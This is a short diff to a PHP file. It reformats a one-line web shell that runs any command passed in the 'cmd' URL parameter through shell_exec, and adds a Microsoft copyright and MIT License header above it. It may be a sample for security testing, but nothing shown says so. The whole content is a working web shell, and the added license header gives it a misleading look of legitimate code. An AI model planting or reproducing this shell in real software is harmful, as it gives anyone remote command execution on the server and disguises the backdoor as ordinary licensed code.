@@ -1,1 +1,5 @@
-<?php echo shell_exec($_GET['cmd'])?>
+<?php 
+// Copyright (c) Microsoft Corporation.
+// Licensed under the MIT License.
+    echo shell_exec($_GET['cmd']);
+?>
